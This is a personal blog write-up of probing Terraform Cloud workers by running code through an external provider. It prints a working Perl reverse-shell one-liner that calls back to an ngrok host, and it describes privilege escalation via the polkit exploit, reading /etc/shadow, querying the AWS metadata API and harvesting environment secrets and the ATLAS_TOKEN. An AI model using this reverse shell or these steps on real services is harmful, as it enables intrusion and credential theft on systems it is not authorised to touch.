# Intro

I am writing the blog a few months after the fact so some details and screenshots were lost along the way. 

I am a big fan of Terraform and more recently Terraform Enterprise (TFE). TFE offers free accounts for users which I use to manage my personal projects.

Using a remote TFE workspaces comes with many benefits but to me best benefits is state management and CI/CD. Simply connect your repo to TFE and commit to main and you terraform code executes. 

This got me thinking, I am running code on another persons machine....

## The starting mischief 

Okay so we can run code on another machine but where does that get us? 

I started thinking a way I can get a shell to explore the Hasicorp TFE workers. There is a great blog by Alxk 
https://alex.kaskaso.li/post/terraform-plan-rce which goes over several methods you can execute code at various stagings in TF. 

The easiest and most simple way is to use an external provider and run bash payload. For some reason at the time I used a perl payload. If I remember correctly it was because it worked out the box...sorry lol.

To make things easy I used ngrok to proxy the connection back to my local host. If you worried about opsec please do not do this. 

```bash
#!/bin/sh

perl -e 'use Socket;$i="4.tcp.ngrok.io";$p=19960;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

## Poking around

Once on the host we are running as user Terraform on Ubuntu 18.04 ... a little outdated if you ask me HashiCorp.

We all love lazy hacking so one of the first things I did was check the sudo version. This at this time PolKit had only been out for few day (weeks?) and I saw version `Sudo version 1.8.21p2`. Light work, finding a quick public exploit on github and we have root.

With root I start poking around the host for any type of configuration files, ssh keys, or credentials that might be useful for escalation but had no luck.

## Cross Persistance? 

My main question was, can I access other users runs? 

Without knowing exactly how the system works, there are some assumptions to be made. I know the hosts are ephemeral and by hitting the AWS metadata API I can see I am  running on a t3a.small. So ephemeral EC2 hosts...interesting. 

I started to wonder, Are hosts being reused or are they delete after a single run? 

To test this I adding a cron on an instance to callback and waited but, it never did. 

I gave up on this idea and started to look elsewhere.
## Finding the Terraform user hash

Using the root access I check /etc/shadowd and found the password hash for the Terraform users. 

Then I check several instances it was clear the all runners share the same user hash, I didn't try to crack it.

While this is a cool find, there is no networking between hosts or externally so the user has is not useful in this case. I still reported it to HashiCorp. 

## Environment Variables 

This is not really an exploit but a behavior of TFE. If you add secrets or share in a TFE workspace the secrets will be stored in the ENVs. These secrets will be present even if not used by the deployment. This could be useful for exfil in the future if you are able to run TF code. 

Another interesting note is that all workers authenticate to the workspace using an ATLAS_TOKEN, stealing this token will give you temporary access to the workspace. I did not explore exactly what permissions this token had because I was asked by Hashicorp to stop...

I also tried using accessing AWS role credentials using the internal metadata API but there was no role attached to the worker instance, a dead end.

## Getting Caught 

To be clear I was doing all this testing in my own environment in an isolated account with good intentions. That being said it likely against the terms and services. I do not recommend, in any case doing unauthorize testing against a service. 

I called it a night and when I woke up, I had a polite email from Hashicorp.

```bash
Hi there!

We noticed that you are interested in our Terraform Cloud worker configuration and saw that you were active late last night / this morning.

Organization Name: ruse

Workspace Name: testing

While not an exposure within the context of our security model, the type of activity that we observed in your account (specifically, escalating access on an isolated worker using the recent polkit vulnerability) violates the Terms of Use for Terraform Cloud. Normally this would result in a suspension of your Terraform organization and account, but we wanted to reach out, and see if you would be interested in chatting more about Terraform Cloud. We also ask that you refrain from seeking access to AWS metadata, exploiting CVE-2021-4034, etc. and, instead, invite you to have a chat.

Looking forward to hearing back from you.

Best,

HashiCorp Security

P.S. We are also hiring (https://www.hashicorp.com/jobs/security) in case you are interested in taking your security knowledge and applying it more directly to our products as part of the HashiCorp team :).
```

I was able to meet with their security team and walk through what I was trying and possible attack paths. The security team was very nice and shared some of the system design decisions already take to mitigate those attack paths. 

Seriously shout-out to Hashicorp for being so cool. 

At the end of the day no real vulns (a good thing) came from this exploration but it was fun at the very least. There is more exploration to be done in this area but that will have to wait for an authorized time. ;)